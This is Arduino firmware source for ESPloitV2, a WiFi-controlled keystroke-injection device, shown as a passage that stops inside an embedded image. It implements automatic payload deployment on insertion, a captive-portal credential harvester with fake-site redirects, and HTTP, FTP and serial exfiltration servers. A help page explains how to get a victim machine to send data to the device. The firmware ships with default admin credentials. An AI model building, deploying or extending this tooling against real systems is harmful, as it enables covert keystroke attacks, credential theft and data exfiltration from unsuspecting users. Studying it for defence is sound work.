/*
 * ESPloitV2
 * WiFi controlled HID Keyboard Emulator
 * By Corey Harding of www.Exploit.Agency / www.LegacySecurityGroup.com
 * Special thanks to minkione for helping port/test original V1 code to the Cactus Micro rev2
 * ESPloit is distributed under the MIT License. The license and copyright notice can not be removed and must be distributed alongside all future copies of the software.
 * MIT License
    
    Copyright (c) [2017] [Corey Harding]
    
    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:
    
    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.
    
    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
*/

//We need this stuff
#include "HelpText.h"
#include "License.h"
#include "inputmode.h"
#include "version.h"
#include "spoof_page.h"
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266httpUpdate.h>
#include <ESP8266HTTPUpdateServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include <ArduinoJson.h> // ArduinoJson library 5.11.0 by Benoit Blanchon https://github.com/bblanchon/ArduinoJson
#include <ESP8266FtpServer.h> // https://github.com/exploitagency/esp8266FTPServer/tree/feature/bbx10_speedup
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include "Duckuino.h"
//#include <SoftwareSerial.h>
//#include <DoubleResetDetector.h> // Double Reset Detector library VERSION: 1.0.0 by Stephen Denne https://github.com/datacute/DoubleResetDetector

//Setup RX and TX pins to be used for the software serial connection
//const int RXpin=5;
//const int TXpin=4;
//SoftwareSerial SOFTserial(RXpin,TXpin);

//Double Reset Detector
/*
#define DRD_TIMEOUT 5
#define DRD_ADDRESS 0
DoubleResetDetector drd(DRD_TIMEOUT, DRD_ADDRESS);
*/

#define LED_BUILTIN 2

// Port for web server
ESP8266WebServer server(80);
ESP8266WebServer httpServer(1337);
ESP8266HTTPUpdateServer httpUpdater;
FtpServer ftpSrv;
const byte DNS_PORT = 53;
DNSServer dnsServer;

HTTPClient http;
String latestversion = "";
String ardversion;

const char* update_path = "/update";
int accesspointmode;
char ssid[32];
char password[64];
int channel;
int hidden;
char local_IPstr[16];
char gatewaystr[16];
char subnetstr[16];
char update_username[32];
char update_password[64];
char ftp_username[32];
char ftp_password[64];
int ftpenabled;
int esportalenabled;
char welcome_domain[128];
char welcome_redirect[128];
char site1_domain[128];
char site1_redirect[128];
char site2_domain[128];
char site2_redirect[128];
char site3_domain[128];
char site3_redirect[128];
char site_other_redirect[128];
int DelayLength;
int livepayloaddelay;
int autopwn;
char autopayload[64];
int open_network=0;

void runpayload() {
    File f = SPIFFS.open(autopayload, "r");
    int defaultdelay = DelayLength;
    int settingsdefaultdelay = DelayLength;
    int custom_delay;
    delay(livepayloaddelay);
    while(f.available()) {
//      SOFTserial.println(line);
//      Serial.println(line);
      String line = f.readStringUntil('\n');
      line.replace("&lt;", "<");

      String fullkeys = line;
      int str_len = fullkeys.length()+1; 
      char keyarray[str_len];
      fullkeys.toCharArray(keyarray, str_len);

      char *i;
      String cmd;
      String cmdinput;
      cmd = String(strtok_r(keyarray,":",&i));

//         Serial.println(String()+"cmd:"+cmd);
//         Serial.println(String()+"cmdin:"+cmdinput);
     
      if(cmd == "Rem") {
        cmdinput = String(strtok_r(NULL,":",&i));
        DelayLength = 0;
      }
      
      else if(cmd == "DefaultDelay") {
        cmdinput = String(strtok_r(NULL,":",&i));
        DelayLength = 1500;
        String newdefaultdelay = cmdinput;
        defaultdelay = newdefaultdelay.toInt();
//          Serial.println(String()+"default delay set to:"+defaultdelay);
      }
      else if(cmd == "BlinkLED") {
        cmdinput = String(strtok_r(NULL,":",&i));
        int blinkcount = cmdinput.toInt();
        for (int i=1; i <= blinkcount; i++){
          digitalWrite(LED_BUILTIN, LOW);
          delay(750);
          digitalWrite(LED_BUILTIN, HIGH);
          delay(500);
        }
      }
      else if(cmd == "CustomDelay") {
        cmdinput = String(strtok_r(NULL,":",&i));
        String customdelay = cmdinput;
        custom_delay = customdelay.toInt();
        DelayLength = custom_delay;
//          Serial.println(String()+"Custom delay set to:"+custom_delay);
      }
      else {
        Serial.println(line);
      }
//        Serial.println(DelayLength);
      delay(DelayLength); //delay between lines in payload, I found running it slower works best
      DelayLength = defaultdelay;
    }
    f.close();
    DelayLength = settingsdefaultdelay;
}

void settingsPage()
{
  if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
  String accesspointmodeyes;
  String accesspointmodeno;
  if (accesspointmode==1){
    accesspointmodeyes=" checked=\"checked\"";
    accesspointmodeno="";
  }
  else {
    accesspointmodeyes="";
    accesspointmodeno=" checked=\"checked\"";
  }
  String autopwnyes;
  String autopwnno;
  if (autopwn==1){
    autopwnyes=" checked=\"checked\"";
    autopwnno="";
  }
  else {
    autopwnyes="";
    autopwnno=" checked=\"checked\"";
  }
  String ftpenabledyes;
  String ftpenabledno;
  if (ftpenabled==1){
    ftpenabledyes=" checked=\"checked\"";
    ftpenabledno="";
  }
  else {
    ftpenabledyes="";
    ftpenabledno=" checked=\"checked\"";
  }
  String esportalenabledyes;
  String esportalenabledno;
  if (esportalenabled==1){
    esportalenabledyes=" checked=\"checked\"";
    esportalenabledno="";
  }
  else {
    esportalenabledyes="";
    esportalenabledno=" checked=\"checked\"";
  }
  String hiddenyes;
  String hiddenno;
  if (hidden==1){
    hiddenyes=" checked=\"checked\"";
    hiddenno="";
  }
  else {
    hiddenyes="";
    hiddenno=" checked=\"checked\"";
  }
  server.send(200, "text/html", 
  String()+
  F(
  "<!DOCTYPE HTML>"
  "<html>"
  "<head>"
  "<meta name = \"viewport\" content = \"width = device-width, initial-scale = 1.0, maximum-scale = 1.0, user-scalable=0\">"
  "<title>ESPloit Settings</title>"
  "<style>"
  "\"body { background-color: #808080; font-family: Arial, Helvetica, Sans-Serif; Color: #000000; }\""
  "</style>"
  "</head>"
  "<body>"
  "<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>"
  "<h1>ESPloit Settings</h1>"
  "<a href=\"/restoredefaults\"><button>Restore Default Configuration</button></a>"
  "<hr>"
  "<FORM action=\"/settings\"  id=\"configuration\" method=\"post\">"
  "<P>"
  "<b>WiFi Configuration:</b><br><br>"
  "<b>Network Type</b><br>"
  )+
  F("Access Point Mode: <INPUT type=\"radio\" name=\"accesspointmode\" value=\"1\"")+accesspointmodeyes+F("><br>"
  "Join Existing Network: <INPUT type=\"radio\" name=\"accesspointmode\" value=\"0\"")+accesspointmodeno+F("><br><br>"
  "<b>Hidden<br></b>"
  "Yes <INPUT type=\"radio\" name=\"hidden\" value=\"1\"")+hiddenyes+F("><br>"
  "No <INPUT type=\"radio\" name=\"hidden\" value=\"0\"")+hiddenno+F("><br><br>"
  "SSID: <input type=\"text\" name=\"ssid\" value=\"")+ssid+F("\" maxlength=\"31\" size=\"31\"><br>"
  "Password: <input type=\"password\" name=\"password\" value=\"")+password+F("\" maxlength=\"64\" size=\"31\"><br>"
  "Channel: <select name=\"channel\" form=\"configuration\"><option value=\"")+channel+"\" selected>"+channel+F("</option><option value=\"1\">1</option><option value=\"2\">2</option><option value=\"3\">3</option><option value=\"4\">4</option><option value=\"5\">5</option><option value=\"6\">6</option><option value=\"7\">7</option><option value=\"8\">8</option><option value=\"9\">9</option><option value=\"10\">10</option><option value=\"11\">11</option><option value=\"12\">12</option><option value=\"13\">13</option><option value=\"14\">14</option></select><br><br>"
  "IP: <input type=\"text\" name=\"local_IPstr\" value=\"")+local_IPstr+F("\" maxlength=\"16\" size=\"31\"><br>"
  "Gateway: <input type=\"text\" name=\"gatewaystr\" value=\"")+gatewaystr+F("\" maxlength=\"16\" size=\"31\"><br>"
  "Subnet: <input type=\"text\" name=\"subnetstr\" value=\"")+subnetstr+F("\" maxlength=\"16\" size=\"31\"><br><br>"
  "<hr>"
  "<b>ESPloit Administration Settings:</b><br><br>"
  "Username: <input type=\"text\" name=\"update_username\" value=\"")+update_username+F("\" maxlength=\"31\" size=\"31\"><br>"
  "Password: <input type=\"password\" name=\"update_password\" value=\"")+update_password+F("\" maxlength=\"64\" size=\"31\"><br><br>"
  "<hr>"
  "<b>FTP Exfiltration Server Settings</b><br>"
  "<small>Changes require a reboot.</small><br>"
  "Enabled <INPUT type=\"radio\" name=\"ftpenabled\" value=\"1\"")+ftpenabledyes+F("><br>"
  "Disabled <INPUT type=\"radio\" name=\"ftpenabled\" value=\"0\"")+ftpenabledno+F("><br><br>"
  "FTP Username: <input type=\"text\" name=\"ftp_username\" value=\"")+ftp_username+F("\" maxlength=\"31\" size=\"31\"><br>"
  "FTP Password: <input type=\"password\" name=\"ftp_password\" value=\"")+ftp_password+F("\" maxlength=\"64\" size=\"31\"><br><br>"
  "<hr>"
  "<b>ESPortal Credential Harvester Settings</b><br>"
  "<small>Changes require a reboot.</small><br>"
  "<small>When enabled ESPloit main menu will appear on http://<b>IP-HERE</b>/esploit</small><br>"
  "<small>Do not leave any line blank or as a duplicate of another.</small><br>"
  "Enabled <INPUT type=\"radio\" name=\"esportalenabled\" value=\"1\"")+esportalenabledyes+F("><br>"
  "Disabled <INPUT type=\"radio\" name=\"esportalenabled\" value=\"0\"")+esportalenabledno+F("><br><br>"
  "Welcome Domain: <input type=\"text\" name=\"welcome_domain\" value=\"")+welcome_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Welcome Page On: <input type=\"text\" name=\"welcome_redirect\" value=\"")+welcome_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site1 Domain: <input type=\"text\" name=\"site1_domain\" value=\"")+site1_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site1 Page On: <input type=\"text\" name=\"site1_redirect\" value=\"")+site1_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site2 Domain: <input type=\"text\" name=\"site2_domain\" value=\"")+site2_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site2 Page On: <input type=\"text\" name=\"site2_redirect\" value=\"")+site2_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site3 Domain: <input type=\"text\" name=\"site3_domain\" value=\"")+site3_domain+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Site3 Page On: <input type=\"text\" name=\"site3_redirect\" value=\"")+site3_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "Catch All Page On: <input type=\"text\" name=\"site_other_redirect\" value=\"")+site_other_redirect+F("\" maxlength=\"127\" size=\"31\"><br>"
  "<hr>"
  "<b>Payload Settings:</b><br><br>"
  "Delay Between Sending Lines of Code in Payload:<br><input type=\"number\" name=\"DelayLength\" value=\"")+DelayLength+F("\" maxlength=\"31\" size=\"10\"> milliseconds (Default: 2000)<br><br>"
  "Delay Before Starting a Live or Auto Deploy Payload:<br><input type=\"number\" name=\"LivePayloadDelay\" value=\"")+livepayloaddelay+F("\" maxlength=\"31\" size=\"10\"> milliseconds (Default: 3000)<br><br>"
  "<b>Automatically Deploy Payload Upon Insetion</b><br>"
  "Yes <INPUT type=\"radio\" name=\"autopwn\" value=\"1\"")+autopwnyes+F("><br>"
  "No <INPUT type=\"radio\" name=\"autopwn\" value=\"0\"")+autopwnno+F("><br><br>"
  "Automatic Payload: <input type=\"text\" name=\"autopayload\" value=\"")+autopayload+F("\" maxlength=\"64\" size=\"31\"><br><br>"
  "<INPUT type=\"radio\" name=\"SETTINGS\" value=\"1\" hidden=\"1\" checked=\"checked\">"
  "<hr>"
  "<INPUT type=\"submit\" value=\"Apply Settings\">"
  "</FORM>"
  "<br><a href=\"/reboot\"><button>Reboot Device</button></a>"
  "</P>"
  "</body>"
  "</html>"
  )
  );
}

void handleSettings()
{
  if (server.hasArg("SETTINGS")) {
    handleSubmitSettings();
  }
  else {
    settingsPage();
  }
}

void returnFail(String msg)
{
  server.sendHeader("Connection", "close");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(500, "text/plain", msg + "\r\n");
}

void handleSubmitSettings()
{
  String SETTINGSvalue;

  if (!server.hasArg("SETTINGS")) return returnFail("BAD ARGS");
  
  SETTINGSvalue = server.arg("SETTINGS");
  accesspointmode = server.arg("accesspointmode").toInt();
  server.arg("ssid").toCharArray(ssid, 32);
  server.arg("password").toCharArray(password, 64);
  channel = server.arg("channel").toInt();
  hidden = server.arg("hidden").toInt();
  server.arg("local_IPstr").toCharArray(local_IPstr, 16);
  server.arg("gatewaystr").toCharArray(gatewaystr, 16);
  server.arg("subnetstr").toCharArray(subnetstr, 16);
  server.arg("update_username").toCharArray(update_username, 32);
  server.arg("update_password").toCharArray(update_password, 64);
  server.arg("ftp_username").toCharArray(ftp_username, 32);
  server.arg("ftp_password").toCharArray(ftp_password, 64);
  ftpenabled = server.arg("ftpenabled").toInt();
  esportalenabled = server.arg("esportalenabled").toInt();
  server.arg("welcome_domain").toCharArray(welcome_domain,128);
  server.arg("welcome_redirect").toCharArray(welcome_redirect,128);
  server.arg("site1_domain").toCharArray(site1_domain,128);
  server.arg("site1_redirect").toCharArray(site1_redirect,128);
  server.arg("site2_domain").toCharArray(site2_domain,128);
  server.arg("site2_redirect").toCharArray(site2_redirect,128);
  server.arg("site3_domain").toCharArray(site3_domain,128);
  server.arg("site3_redirect").toCharArray(site3_redirect,128);
  server.arg("site_other_redirect").toCharArray(site_other_redirect,128);
  DelayLength = server.arg("DelayLength").toInt();
  livepayloaddelay = server.arg("LivePayloadDelay").toInt();
  autopwn = server.arg("autopwn").toInt();
  server.arg("autopayload").toCharArray(autopayload, 64);
  
  if (SETTINGSvalue == "1") {
    saveConfig();
    server.send(200, "text/html", F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/reboot\"><button>Reboot Device</button></a><br><br>Settings have been saved.<br>Some setting may require manually rebooting ESPloit before taking effect.<br>If network configuration has changed then connect to the new network to access ESPloit."));
    loadConfig();
  }
  else if (SETTINGSvalue == "0") {
    settingsPage();
  }
  else {
    returnFail("Bad SETTINGS value");
  }
}

bool loadDefaults() {
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.createObject();
  json["version"] = version;
  json["accesspointmode"] = "1";
  json["ssid"] = "Exploit";
  if(open_network==0){
    json["password"] = "DotAgency";
  }
  else if(open_network==1){
    json["password"] = "";
  }
  json["channel"] = "6";
  json["hidden"] = "0";
  json["local_IP"] = "192.168.1.1";
  json["gateway"] = "192.168.1.1";
  json["subnet"] = "255.255.255.0";
  json["update_username"] = "admin";
  json["update_password"] = "hacktheplanet";
  json["ftp_username"] = "ftp-admin";
  json["ftp_password"] = "hacktheplanet";
  json["ftpenabled"] = "0";
  json["esportalenabled"] = "0";
  json["welcome_domain"] = "ouraccesspoint.com";
  json["welcome_redirect"] = "/welcome";
  json["site1_domain"] = "fakesite1.com";
  json["site1_redirect"] = "/login";
  json["site2_domain"] = "fakesite2.com";
  json["site2_redirect"] = "/sign-in";
  json["site3_domain"] = "fakesite3.com";
  json["site3_redirect"] = "/authenticate";
  json["site_other_redirect"] = "/user/login";
  json["DelayLength"] = "2000";
  json["LivePayloadDelay"] = "3000";
  json["autopwn"] = "0";
  json["autopayload"] = "/payloads/payload.txt";
  File configFile = SPIFFS.open("/esploit.json", "w");
  json.printTo(configFile);
  loadConfig();
}

bool loadConfig() {
  File configFile = SPIFFS.open("/esploit.json", "r");
  if (!configFile) {
    loadDefaults();
  }

  size_t size = configFile.size();

  std::unique_ptr<char[]> buf(new char[size]);
  configFile.readBytes(buf.get(), size);
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.parseObject(buf.get());
  
  if (!json["version"]) {
    loadDefaults();
    ESP.restart();
  }

  //Resets config to factory defaults on an update.
  if (json["version"]!=version) {
    loadDefaults();
    ESP.restart();
  }

  strcpy(ssid, (const char*)json["ssid"]);
  strcpy(password, (const char*)json["password"]);
  channel = json["channel"];
  hidden = json["hidden"];
  accesspointmode = json["accesspointmode"];
  strcpy(local_IPstr, (const char*)json["local_IP"]);
  strcpy(gatewaystr, (const char*)json["gateway"]);
  strcpy(subnetstr, (const char*)json["subnet"]);

  strcpy(update_username, (const char*)json["update_username"]);
  strcpy(update_password, (const char*)json["update_password"]);

  strcpy(ftp_username, (const char*)json["ftp_username"]);
  strcpy(ftp_password, (const char*)json["ftp_password"]);
  ftpenabled = json["ftpenabled"];

  esportalenabled = json["esportalenabled"];
  strcpy(welcome_domain, (const char*)json["welcome_domain"]);
  strcpy(welcome_redirect, (const char*)json["welcome_redirect"]);
  strcpy(site1_domain, (const char*)json["site1_domain"]);
  strcpy(site1_redirect, (const char*)json["site1_redirect"]);
  strcpy(site2_domain, (const char*)json["site2_domain"]);
  strcpy(site2_redirect, (const char*)json["site2_redirect"]);
  strcpy(site3_domain, (const char*)json["site3_domain"]);
  strcpy(site3_redirect, (const char*)json["site3_redirect"]);
  strcpy(site_other_redirect, (const char*)json["site_other_redirect"]);
  
  DelayLength = json["DelayLength"];
  livepayloaddelay = json["LivePayloadDelay"];

  autopwn = json["autopwn"];
  strcpy(autopayload, (const char*)json["autopayload"]);

  IPAddress local_IP;
  local_IP.fromString(local_IPstr);
  IPAddress gateway;
  gateway.fromString(gatewaystr);
  IPAddress subnet;
  subnet.fromString(subnetstr);

/*
  Serial.println(accesspointmode);
  Serial.println(ssid);
  Serial.println(password);
  Serial.println(channel);
  Serial.println(hidden);
  Serial.println(local_IP);
  Serial.println(gateway);
  Serial.println(subnet);
*/

  WiFi.persistent(false);
  //ESP.eraseConfig();
// Determine if set to Access point mode
  if (accesspointmode == 1) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP);

//    Serial.print("Starting Access Point ... ");
//    Serial.println(WiFi.softAP(ssid, password, channel, hidden) ? "Success" : "Failed!");
    WiFi.softAP(ssid, password, channel, hidden);

//    Serial.print("Setting up Network Configuration ... ");
//    Serial.println(WiFi.softAPConfig(local_IP, gateway, subnet) ? "Success" : "Failed!");
    WiFi.softAPConfig(local_IP, gateway, subnet);

//    WiFi.reconnect();

//    Serial.print("IP address = ");
//    Serial.println(WiFi.softAPIP());
  }
// or Join existing network
  else if (accesspointmode != 1) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_STA);
//    Serial.print("Setting up Network Configuration ... ");
    WiFi.config(local_IP, gateway, subnet);
//    WiFi.config(local_IP, gateway, subnet);

//    Serial.print("Connecting to network ... ");
//    WiFi.begin(ssid, password);
    WiFi.begin(ssid, password);
    WiFi.reconnect();

//    Serial.print("IP address = ");
//    Serial.println(WiFi.localIP());
  }

  return true;
}

bool saveConfig() {
  StaticJsonBuffer<500> jsonBuffer;
  JsonObject& json = jsonBuffer.createObject();
  json["version"] = version;
  json["accesspointmode"] = accesspointmode;
  json["ssid"] = ssid;
  json["password"] = password;
  json["channel"] = channel;
  json["hidden"] = hidden;
  json["local_IP"] = local_IPstr;
  json["gateway"] = gatewaystr;
  json["subnet"] = subnetstr;
  json["update_username"] = update_username;
  json["update_password"] = update_password;
  json["ftp_username"] = ftp_username;
  json["ftp_password"] = ftp_password;
  json["ftpenabled"] = ftpenabled;
  json["esportalenabled"] = esportalenabled;
  json["welcome_domain"] = welcome_domain;
  json["welcome_redirect"] = welcome_redirect;
  json["site1_domain"] = site1_domain;
  json["site1_redirect"] = site1_redirect;
  json["site2_domain"] = site2_domain;
  json["site2_redirect"] = site2_redirect;
  json["site3_domain"] = site3_domain;
  json["site3_redirect"] = site3_redirect;
  json["site_other_redirect"] = site_other_redirect;
  json["DelayLength"] = DelayLength;
  json["LivePayloadDelay"] = livepayloaddelay;
  json["autopwn"] = autopwn;
  json["autopayload"] = autopayload;

  File configFile = SPIFFS.open("/esploit.json", "w");
  json.printTo(configFile);
  return true;
}

File fsUploadFile;
String webString;

void handleFileUpload()
{
  if(server.uri() != "/upload") return;
  HTTPUpload& upload = server.upload();
  if(upload.status == UPLOAD_FILE_START){
    String filename = upload.filename;
    filename = "/payloads/"+filename;
//    Serial.print("Uploading file "); 
//    Serial.print(filename+" ... ");
    String truncatedname = filename.substring(0,31);
    fsUploadFile = SPIFFS.open(truncatedname, "w");
    filename = String();
  }
  else if(upload.status == UPLOAD_FILE_WRITE){
    if(fsUploadFile)
    fsUploadFile.write(upload.buf, upload.currentSize);
  }
  else if(upload.status == UPLOAD_FILE_END){
    if(fsUploadFile)
    fsUploadFile.close();
//    Serial.println("Success");
  }
}

void ListPayloads(){
  String directory;
  if(server.uri() == "/listpayloads") directory="/payloads";
  if(server.uri() == "/exfiltrate/list") directory="/";
  FSInfo fs_info;
  SPIFFS.info(fs_info);
  String total;
  total=fs_info.totalBytes;
  String used;
  used=fs_info.usedBytes;
  String freespace;
  freespace=fs_info.totalBytes-fs_info.usedBytes;
  String FileList = "<a href=\"/esploit\"><- BACK TO INDEX</a><br><br>";
  Dir dir = SPIFFS.openDir(directory);
  if(server.uri() == "/listpayloads") FileList += "File System Info Calculated in Bytes<br><b>Total:</b> "+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+"<br><br><a href=\"/uploadpayload\">Upload Payload</a><br><br><a href=\"/livepayload\">Live Payload Mode</a><br><br><table border='1'><tr><td><b>Display Payload Contents</b></td><td><b>Size in Bytes</b></td><td><b>Run Payload</b></td><td><b>Download File</b></td><td><b>Delete Payload</b></td></tr>";
  if(server.uri() == "/exfiltrate/list") FileList += String()+F("To exfiltrate data using the serial method find the com port device is connected to<br>then be sure to set the baud rate to 38400 on the victim machine<br>and send the text \"SerialEXFIL:\" followed by the data to exfiltrate.<br>To exfiltrate data using the WiFi methods be sure ESPloit and Target machine are on the same network.<br>Either set ESPloit to join the Target's network or set the Target to join ESPloit's AP.<br><small>Current Network Configuration: ESPloit's IP= <b>")+local_IPstr+"</b> SSID = <b>"+ssid+"</b> PASSWORD = <b>"+password+"</b><br>Windows: netsh wlan set hostednetwork mode=allow ssid=\"<b>"+ssid+"</b>\" key=\"<b>"+password+"</b>\"<br>Linux: nmcli dev wifi connect <b>"+ssid+"</b> password <b>"+password+"</b></small><br>For HTTP exfiltration method point the target machine to the url listed below:<br><small>http://<b>"+local_IPstr+"</b>/exfiltrate?file=<b>FILENAME.TXT</b>&data=<b>EXFILTRATED-DATA-HERE</b></small><br>For FTP exfiltration method use the credentials listed below:<br><small>Server: <b>"+local_IPstr+"</b> Username: <b>"+ftp_username+"</b> Password: <b>"+ftp_password+"</b></small><br>See the example payloads for more in depth examples.<br><br>File System Info Calculated in Bytes<br><b>Total:</b> "+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+"<br><br><table border='1'><tr><td><b>Display File Contents</b></td><td><b>Size in Bytes</b></td><td><b>Download File</b></td><td><b>Delete File</b></td></tr>";
  while (dir.next()) {
    String FileName = dir.fileName();
    File f = dir.openFile("r");
    FileList += " ";
    if(server.uri() == "/listpayloads") FileList += "<tr><td><a href=\"/showpayload?payload="+FileName+"\">"+FileName+"</a></td>"+"<td>"+f.size()+"</td><td><a href=\"/dopayload?payload="+FileName+"\"><button>Run Payload</button></a></td><td><a href=\""+FileName+"\"><button>Download File</button></td><td><a href=\"/deletepayload?payload="+FileName+"\"><button>Delete Payload</button></td></tr>";
    if((server.uri() == "/exfiltrate/list")&&(!FileName.startsWith("/payloads/"))&&(!FileName.startsWith("/esploit.json"))&&(!FileName.startsWith("/esportal.json"))&&(!FileName.startsWith("/config.json"))) FileList += "<tr><td><a href=\"/showpayload?payload="+FileName+"\">"+FileName+"</a></td>"+"<td>"+f.size()+"</td><td><a href=\""+FileName+"\"><button>Download File</button></td><td><a href=\"/deletepayload?payload="+FileName+"\"><button>Delete File</button></td></tr>";
  }
  FileList += "</table>";
  server.send(200, "text/html", FileList);
}

bool RawFile(String rawfile) {
  if (SPIFFS.exists(rawfile)) {
    if(!server.authenticate(update_username, update_password)){
      server.requestAuthentication();}
    File file = SPIFFS.open(rawfile, "r");
    size_t sent = server.streamFile(file, "application/octet-stream");
    file.close();
    return true;
  }
  return false;
}

void ShowPayloads(){
  webString="";
  String payload;
  String ShowPL;
  payload += server.arg(0);
  File f = SPIFFS.open(payload, "r");
  String webString = f.readString();
  f.close();
  if (!payload.endsWith(".txt")) {
    server.sendHeader("Location", String("http://"+String(local_IPstr)+payload), true);
    server.send ( 302, "text/plain", "");
  }
  if (payload.startsWith("/payloads/")) ShowPL = String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/listpayloads\">List Payloads</a><br><br><a href=\"/dopayload?payload=")+payload+"\"><button>Run Payload</button></a> - <a href=\""+payload+"\"><button>Download File</button><a> - <a href=\"/deletepayload?payload="+payload+"\"><button>Delete Payload</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
  else if (!payload.startsWith("/payloads")) ShowPL = String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/exfiltrate/list\">List Exfiltrated Data</a><br><br><a href=\"")+payload+"\"><button>Download File</button><a> - <a href=\"/deletepayload?payload="+payload+"\"><button>Delete File</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
  else ShowPL = String()+F("<a href=\"/esploit\"><- BACK TO INDEX</a><br><br><a href=\"/exfiltrate/list\">List Data</a><br><br><a href=\"")+payload+"\"><button>Download File</button><a> - <a href=\"/deletepayload?payload="+payload+"\"><button>Delete File</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
  webString="";
  server.send(200, "text/html", ShowPL);
}

void setup(void)
{
//  SOFTserial.begin(38400);
//  Serial.begin(115200);
//  Serial.println("");
//  Serial.println("ESPloit - Wifi Controlled HID Keyboard Emulator");
//  Serial.println("");
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Serial.begin(38400);
  SPIFFS.begin();
  
 // loadDefaults(); //uncomment to restore default settings if double reset fails for some reason
 /*
  if (drd.detectDoubleReset()) {
    Serial.println("Double Reset Detected");
    loadDefaults();
  }
  */
  
  loadConfig();

//Set up Web Pages
  char rootdir[10];
  if (esportalenabled==1){
    String("/esploit").toCharArray(rootdir,10);
  }
  else {
    String("/").toCharArray(rootdir,10);
    server.on("/esploit",[]() {
      server.sendHeader("Location", String("/"), true);
      server.send ( 302, "text/plain", "");
    });
  }
  server.on(rootdir,[]() {
    FSInfo fs_info;
    SPIFFS.info(fs_info);
    String total;
    total=fs_info.totalBytes;
    String used;
    used=fs_info.usedBytes;
    String freespace;
    freespace=fs_info.totalBytes-fs_info.usedBytes;
    if (ardversion == "") {
      ardversion = "2.0(Guessing)";
      Serial.println("GetVersion:X"); //check 32u4 version info
    }
    server.send(200, "text/html", String()+F("<html><body><b>ESPloit v")+version+F("</b> - WiFi controlled HID Keyboard Emulator<br><img width='86' height='86' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK0AAACtCAYAAADCr/9DAAAMlUlEQVR4nOydD+yVVf3Hz/VvWprYEDRQc5BzS2C5LJdbZs6BQAmBUFkjV1tNk5htZuKf/pCMyKmF2lrFLNCKQAUDM4otSWFjfUmJWlgtU0RTQQRT0Nv703O+7Ha53+99/pzzfM655/3aPjv9ft57ns9zzovzPc9zz3Oew5rNpiEkJg7RToCQolBaEh2UlkQHpSXRQWlJdFBaEh2UlkQHpSXRQWlJdBymnUAv0mg0jkExzP6fO5rN5m7NfHoNSlsSiHkoinMQExFnmEzS/ji67bN7Uexoia2IBxCPQOjXa0y7J2hw7UF+IN9xKMYjJiEmII6vWOULiNWIVYg16IudFetLAkqbA8h6EoobEZ82/v467Uf8SI6DPnna0zF6Ako7CHZk/TLiSsRRNR32FcRtiPkceTtDaTsAWY80majXIIYopfEi4ibEbeijV5VyCBJK2waElQupexHv087F8ijiYvTTDu1EQoHStgBhx6JYiRipnUsbTyImo682aycSAvxxwQJhL0ax3oQnrCA5rbc5Jg+lNf8T9moUyxFv1s5lECS35TbXpEl+egAJLkfxXe08CnIF+m2RdhJaJC0thP0QijUmvl8G5Z7uePTdWu1ENEhWWgg7GsUGo3dLqypyS+y96L+/aidSN0nOaSHsW012lyBWYQXJfaU9l6RIUlqwFHG6dhIOkHNYqp1E3SQnLUamD6O4SDsPh1xkzykZkprT2uWEj5lsKWEvIUsdz0xlmWNqI+1lpveEFeScLtNOoi6SGWkxysrC7G2IE7Vz8cR2xCj0517tRHyT0kg7x/SusIKc2xztJOogpZFW7meO0s7DM9vQn6O1k/BNEiMthJVbQ70urDDKnmtPk4S0JnumKxV6/lxTkXaidgI10vPn2vNzWvsz53OIw7VzqYl9iKHo113aifjC2+omyCKjuFwUjEPIA4J/lEBj7vF1zAE4z6QjrCDneh7ivjoPiv6W9b5jEPL0x/OIPpNdGDofFb1Ia1dQ3WUOfs5qF/7bF3AeP/Zx3AE4pcZjhUKt54w+nYXiFkT74h152mIW+nuby+M5n9MiyQ+a7F9ZpwcD5aTuwmd+gqhrDeuwmo4TErWcM/rwCMTPTLZfQ6fVZu9HbLZOOMOptEjuWBSLTdu2QB34BOLumsQdXsMxQsP7OaPvZBryc8T0Lh8VFxZbN5zgeqSV55dOzvnZaaYecTnSOsYKuwyRd3WZOOHs2